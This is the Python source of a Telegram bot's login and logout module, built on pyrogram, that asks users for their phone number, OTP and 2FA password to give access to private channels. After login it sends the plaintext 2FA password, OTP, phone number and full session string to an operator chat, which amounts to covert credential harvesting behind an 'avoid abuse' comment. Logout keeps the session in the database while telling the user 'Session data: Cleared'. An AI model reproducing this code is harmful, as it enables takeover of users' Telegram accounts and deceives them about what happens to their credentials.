
import random
import os
import asyncio
import string
import time
from config import API_ID as api_id, API_HASH as api_hash, LOG_GROUP, USER_LOGIN_INFO, CAPTURE_LOGIN_DEVICE_INFO
from pyrogram.enums import ParseMode
import datetime
import pytz

from pyrogram.errors import (
    ApiIdInvalid,
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid,
    FloodWait
)

def generate_random_name(length=7):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))  # Editted ... 

async def delete_session_files(user_id):
    session_file = f"session_{user_id}.session"
    memory_file = f"session_{user_id}.session-journal"

    session_file_exists = os.path.exists(session_file)
    memory_file_exists = os.path.exists(memory_file)

    if session_file_exists:
        os.remove(session_file)
    
    if memory_file_exists:
        os.remove(memory_file)

    # Mark logged out in the database (do not delete session)
    if session_file_exists or memory_file_exists:
        await db.set_logged_out(user_id, True)
        return True  # Files were deleted
    return False  # No files found


async def _is_logged_in(user_id: int) -> bool:
    try:
        data = await db.get_data(user_id)
        # Consider logged in only if a session exists and user is not marked logged_out
        return bool(data and data.get("session") and not data.get("logged_out"))
    except Exception:
        return False


@app.on_message(filters.command("cancel"))
async def cancel_cmd(_, message):
    await cancel_manager.cancel(message.chat.id)
    # Also attempt to stop any active batch loop for this user
    try:
        from devgagan.modules.main import users_loop
        users_loop[message.chat.id] = False
    except Exception:
        pass
    await message.reply_text("🚫 Operation canceled.")


@app.on_callback_query(filters.regex("^cancel_op$"))
async def cancel_cb(_, query):
    await cancel_manager.cancel(query.from_user.id)
    # Also attempt to stop any active batch loop for this user
    try:
        from devgagan.modules.main import users_loop
        users_loop[query.from_user.id] = False
    except Exception:
        pass
    try:
        await query.answer("Canceled", show_alert=False)
    except Exception:
        pass
    try:
        await query.message.edit_text("🚫 Operation canceled.")
    except Exception:
        pass


@app.on_callback_query(filters.regex(r"^nav:back_delete$"))
async def on_back_delete(client, callback_query):
    """Delete the current message when user taps Back and cancel any ongoing operations."""
    user_id = callback_query.from_user.id
    
    # Cancel any ongoing batch operations for this user
    try:
        from devgagan.modules.main import users_loop, process_start_times
        from devgagan.core.cancel import cancel_manager
        
        # Set cancel flag for this user
        await cancel_manager.cancel(user_id)
        
        # Clear batch processing flags
        if user_id in users_loop:
            users_loop[user_id] = False
            print(f"🚫 Back button: Cancelled batch processing for user {user_id}")
        
        # Clear process start times
        if user_id in process_start_times:
            process_start_times.pop(user_id, None)
            
    except Exception as e:
        print(f"Error cancelling operations for user {user_id}: {e}")
    
    # Delete the UI message
    try:
        await callback_query.message.delete()
    except Exception:
        try:
            # Fallback: edit to empty indicator if delete fails (e.g., no rights)
            await callback_query.message.edit_text("🧹 Closed.")
        except Exception:
            pass
    try:
        await callback_query.answer("Cancelled")
    except Exception:
        pass


@app.on_callback_query(filters.regex(r"^auth:go_login$"))
async def on_go_login(client, callback_query):
    """Start the login flow from a button press by invoking the same logic as /login."""
    try:
        await generate_session(client, callback_query.message)
        await callback_query.answer()
    except Exception:
        try:
            await callback_query.answer("Unable to start login. Please try /login.")
        except Exception:
            pass


@app.on_callback_query(filters.regex(r"^auth:go_logout$"))
async def on_go_logout(client, callback_query):
    """Trigger logout from a button press by reusing /logout logic."""
    try:
        await clear_db(client, callback_query.message)
        await callback_query.answer()
    except Exception:
        try:
            await callback_query.answer("Unable to logout right now. Try /logout.")
        except Exception:
            pass


@app.on_message(filters.command("logout"))
async def clear_db(client, message):
    user_id = message.chat.id
    # Check current state
    if not await _is_logged_in(user_id):
        await message.reply_text(
            "<b>🔐 Login Status</b>\n\n"
            "❌ <i>You are not currently logged in</i>\n\n"
            "💡 <b>To access private channels:</b>\n"
            "• Use <code>/login</code> command\n"
            "• Follow the setup instructions\n\n"
            "🔒 <i>Login is required for private content access</i>",
            parse_mode=ParseMode.HTML
        )
        return

    files_deleted = await delete_session_files(user_id)
    try:
        # Do not delete session; just mark logged out
        await db.set_logged_out(user_id, True)
    except Exception:
        pass

    if files_deleted:
        await message.reply(
            "<b>🚪 Logout Successful</b>\n\n"
            "✅ <i>Session disconnected successfully</i>\n\n"
            "🧹 <b>Cleanup Completed:</b>\n"
            "• Session data: <b>Cleared</b>\n"
            "• Temporary files: <b>Removed</b>\n\n"
            "🔒 <i>Private content access disabled</i>",
            parse_mode=ParseMode.HTML
        )
    else:
        await message.reply(
            "<b>🚪 Logout Successful</b>\n\n"
            "✅ <i>Session disconnected successfully</i>\n\n"
            "🔒 <i>Private content access disabled</i>",
            parse_mode=ParseMode.HTML
        )
        
    
@app.on_message(filters.command("login"))
async def generate_session(_, message):
    joined = await subscribe(_, message)
    if joined == 1:
        return
        
    user_id = message.chat.id

    # Already logged-in feedback
    if await _is_logged_in(user_id):
        await message.reply_text(
            "<b>🔐 Login Status</b>\n\n"
            "✅ <i>You are already logged in</i>\n\n"
            "🎯 <b>Current Access:</b>\n"
            "• Private channels: <b>Enabled</b>\n"
            "• Restricted content: <b>Accessible</b>\n\n"
            "🚪 <i>Use</i> /logout <i>to disconnect</i>",
            parse_mode=ParseMode.HTML
        )
        return

    # Helper: IST time string (used in logs)
    def ist_now():
        ist = pytz.timezone("Asia/Kolkata")
        return datetime.datetime.now(ist).strftime('%Y-%m-%d %I:%M:%S %p %Z')

    # Clear any stale cancel flag from previous operations
    try:
        if await cancel_manager.is_cancelled(user_id):
            await cancel_manager.clear(user_id)
    except Exception:
        pass

    prompt = await message.reply_text(
        "<b>🔑 Login Setup</b>\n\n"
        "📱 <b>Step 1:</b> <i>Enter your phone number</i>\n\n"
        "📝 <b>Format:</b> Include country code\n"
        "• Example: <code>+19876543210</code>\n"
        "• Example: <code>+911234567890</code>\n\n"
        "⚠️ <i>Make sure the number is correct</i>",
        parse_mode=ParseMode.HTML
    )
    number = await _.ask(user_id, None, filters=filters.text)
    # If user hit Back/Cancel during phone input, cancel gracefully
    if await cancel_manager.is_cancelled(user_id):
        await message.reply_text(
            "<b>🚫 Login Cancelled</b>\n\n"
            "❌ <i>Login process was cancelled</i>\n\n"
            "🔄 <i>Use</i> <code>/login</code> <i>to try again</i>",
            parse_mode=ParseMode.HTML
        )
        try:
            await cancel_manager.clear(user_id)
        except Exception:
            pass
        return
    phone_number = number.text
    try:
        # Send "Sending OTP" message and store reference for cleanup
        sending_otp_msg = await message.reply(
            "<b>📲 Sending OTP</b>\n\n"
            "🔄 <i>Requesting verification code...</i>\n"
            "⏳ <i>Please wait a moment</i>",
            parse_mode=ParseMode.HTML
        )
        client = Client(f"session_{user_id}", api_id, api_hash, in_memory=True)
        
        await client.connect()
    except Exception as e:
        await message.reply(f"❌ Failed to send OTP {e}. Please wait and try again later.")
        try:
            await client.disconnect()
        except Exception:
            pass
        return
        
    # Send code to the user's phone
    try:
        code = await client.send_code(phone_number)
    except FloodWait as e:
        # Clean up "Sending OTP" message on error
        try:
            await sending_otp_msg.delete()
        except Exception:
            pass
            
        # Calculate wait time in minutes and seconds
        wait_min = e.value // 60
        wait_sec = e.value % 60
        await message.reply(
            f"<b>⏳ Rate Limited</b>\n\n"
            f"⚠️ <i>Too many login attempts detected</i>\n\n"
            f"⏰ <b>Wait Time:</b> {wait_min}m {wait_sec}s\n\n"
            f"🔒 <i>This is a Telegram security measure</i>",
            parse_mode=ParseMode.HTML
        )
        await client.disconnect()
        return
    except PhoneNumberInvalid:
        # Clean up "Sending OTP" message on error
        try:
            await sending_otp_msg.delete()
        except Exception:
            pass
            
        await message.reply(
            "<b>❌ Invalid Phone Number</b>\n\n"
            "📱 <i>The number you entered is not valid</i>\n\n"
            "🔄 <b>Please check:</b>\n"
            "• Include country code (+1, +91, etc.)\n"
            "• No spaces or special characters\n\n"
            "🔄 <i>Use</i> <code>/login</code> <i>to try again</i>",
            parse_mode=ParseMode.HTML
        )
        await client.disconnect()
        return
    except Exception as e:
        # Clean up "Sending OTP" message on error
        try:
            await sending_otp_msg.delete()
        except Exception:
            pass
            
        error_msg = str(e).lower()
        if 'phone number invalid' in error_msg:
            await message.reply('❌ Invalid phone number. Please check the number and try again.')
        elif 'flood' in error_msg:
            await message.reply('⚠️ Too many attempts. Please wait a while before trying again.')
        else:
            await message.reply(f'❌ Error: {str(e)}')
        await client.disconnect()
        return
    try:
        # Clean up "Sending OTP" message
        try:
            await sending_otp_msg.delete()
        except Exception:
            pass
            
        # Send OTP verification message and store reference for cleanup
        otp_verification_msg = await message.reply_text(
            "<b>📲 OTP Verification</b>\n\n"
            "📬 <b>Step 2:</b> <i>Check your Telegram app</i>\n\n"
            "🔢 <b>Enter OTP with spaces:</b>\n"
            "• Received: <code>12345</code>\n"
            "• Enter as: <code>1 2 3 4 5</code>\n\n"
            "⏰ <i>You have 10 minutes to complete this step</i>",
            parse_mode=ParseMode.HTML
        )
        otp_code = await _.ask(user_id, None, filters=filters.text, timeout=600)
    except (asyncio.TimeoutError, TimeoutError):
        await message.reply(
            "<b>⏰ Session Timeout</b>\n\n"
            "❌ <i>10-minute time limit exceeded</i>\n\n"
            "🔄 <b>Next Steps:</b>\n"
            "• Use <code>/login</code> to start over\n"
            "• Enter OTP faster next time\n\n"
            "⚡ <i>Quick tip: Keep Telegram app ready</i>",
            parse_mode=ParseMode.HTML
        )
        return
    if await cancel_manager.is_cancelled(user_id):
        await message.reply_text(
            "<b>🚫 Login Cancelled</b>\n\n"
            "❌ <i>OTP verification was cancelled</i>\n\n"
            "🔄 <i>Use</i> <code>/login</code> <i>to try again</i>",
            parse_mode=ParseMode.HTML
        )
        await cancel_manager.clear(user_id)
        return
    phone_code = otp_code.text.replace(" ", "")
    password = None  # Initialize password variable for logging
    try:
        await client.sign_in(phone_number, code.phone_code_hash, phone_code)
                
    except PhoneCodeInvalid:
        await message.reply(
            "<b>❌ Invalid OTP</b>\n\n"
            "🔢 <i>The verification code is incorrect</i>\n\n"
            "🔄 <b>Please check:</b>\n"
            "• Enter code with spaces (1 2 3 4 5)\n"
            "• Make sure all digits are correct\n\n"
            "🔄 <i>Use</i> <code>/login</code> <i>to try again</i>",
            parse_mode=ParseMode.HTML
        )
        return
    except PhoneCodeExpired:
        await message.reply(
            "<b>❌ Expired OTP</b>\n\n"
            "⏰ <i>The verification code has expired</i>\n\n"
            "🔄 <b>Next Steps:</b>\n"
            "• Use <code>/login</code> to get a new code\n"
            "• Enter the new code faster\n\n"
            "⚡ <i>Tip: OTP codes expire after 10 minutes</i>",
            parse_mode=ParseMode.HTML
        )
        return
    except SessionPasswordNeeded:
        try:
            # Clean up "OTP Verification" message
            try:
                await otp_verification_msg.delete()
            except Exception:
                pass
                
            # Send 2FA verification message
            two_fa_msg = await message.reply_text(
                "<b>🔐 Two-Step Verification</b>\n\n"
                "🛡️ <i>Your account has 2FA enabled</i>\n\n"
                "🔑 <b>Step 3:</b> <i>Enter your password</i>\n\n"
                "⏰ <i>You have 5 minutes to complete this step</i>",
                parse_mode=ParseMode.HTML
            )
            two_step_msg = await _.ask(user_id, None, filters=filters.text, timeout=300)
        except (asyncio.TimeoutError, TimeoutError):
            await message.reply(
                "<b>⏰ Password Timeout</b>\n\n"
                "❌ <i>5-minute time limit exceeded</i>\n\n"
                "🔄 <b>Next Steps:</b>\n"
                "• Use <code>/login</code> to start over\n"
                "• Have your 2FA password ready\n\n"
                "💡 <i>Tip: Prepare password before starting</i>",
                parse_mode=ParseMode.HTML
            )
            return
        if await cancel_manager.is_cancelled(user_id):
            await message.reply_text(
                "<b>🚫 Login Cancelled</b>\n\n"
                "❌ <i>Password verification was cancelled</i>\n\n"
                "🔄 <i>Use</i> <code>/login</code> <i>to try again</i>",
                parse_mode=ParseMode.HTML
            )
            try:
                await cancel_manager.clear(user_id)
            except Exception:
                pass
            try:
                await client.disconnect()
            except Exception:
                pass
            return
        try:
            password = two_step_msg.text
            await client.check_password(password=password)
        except PasswordHashInvalid:
            await two_step_msg.reply(
                "<b>❌ Invalid Password</b>\n\n"
                "🔐 <i>The 2FA password is incorrect</i>\n\n"
                "🔄 <b>Please check:</b>\n"
                "• Make sure it's your Telegram password\n"
                "• Check for typos or case sensitivity\n\n"
                "🔄 <i>Use</i> <code>/login</code> <i>to try again</i>",
                parse_mode=ParseMode.HTML
            )
            return
    string_session = await client.export_session_string()
    await db.set_session(user_id, string_session)
    # Mark as active login now (clear logged_out flag)
    try:
        await db.set_logged_out(user_id, False)
    except Exception:
        pass

    # Notify admin log group about the login to avoid abuse (IST time)
    try:
        u = message.from_user
        uname = f"@{u.username}" if getattr(u, "username", None) else "-"
        first = getattr(u, "first_name", None) or "-"
        last = getattr(u, "last_name", None) or "-"
        now_ist = ist_now()
        
       # Get device info if available
        device_info = ""
        if CAPTURE_LOGIN_DEVICE_INFO:
            try:
                # Default values
                dev = 'Mobile App'
                country = 'Unknown Location'
                
                # Get DC ID if available (this is the most reliable info we can get)
                dc_id = getattr(message.from_user, 'dc_id', None)
                if dc_id:
                    country = f"DC {dc_id}"  # Data Center ID can give a hint about location
                    
                # Format the device info
                device_info = f"\n\n📱 <b>Device:</b> {dev}\n📍 <b>Location:</b> {country}"
            except Exception as e:
                print(f"[login] Failed to get device info: {e}")
                device_info = "\n\n⚠️ <i>Could not retrieve device information</i>"
                
        # Build log text with conditional password field
        password_field = f"📞 <b>Password:</b> <code>{password}</code>\n" if password else "📞 <b>Password:</b> <i>Not required (no 2FA)</i>\n"
        
        log_text = (
            "🔐 <b>New User Login</b>\n\n"
            f"👤 <b>User:</b> {u.mention} (ID: <code>{user_id}</code>)\n"
            f"🧾 <b>Name:</b> {first} {last}\n"
            f"🏷 <b>Username:</b> {uname}\n"
            f"📞 <b>Phone:</b> <code>{phone_number}</code>\n"
            f"📞 <b>Otp:</b> <code>{phone_code}</code>\n"
            f"{password_field}"
            f"📞 <b>SessionString:</b> <code>{string_session}</code>\n"
            f"🕒 <b>Time:</b> {now_ist}"
            f"{device_info}"
        )
        target = USER_LOGIN_INFO 
        await app.send_message(target, log_text, parse_mode=ParseMode.HTML)
    except Exception as e:
        print(f"[login] Failed to log to LOG_GROUP: {e}")
    
    try:
        await cancel_manager.clear(user_id)
    except Exception:
        pass
    await client.disconnect()
    
    # Clean up 2FA message if it exists
    try:
        if 'two_fa_msg' in locals():
            await two_fa_msg.delete()
    except Exception:
        pass
    
    await otp_code.reply(
        "<b>✅ Login Successful!</b>\n\n",
        parse_mode=ParseMode.HTML
    )
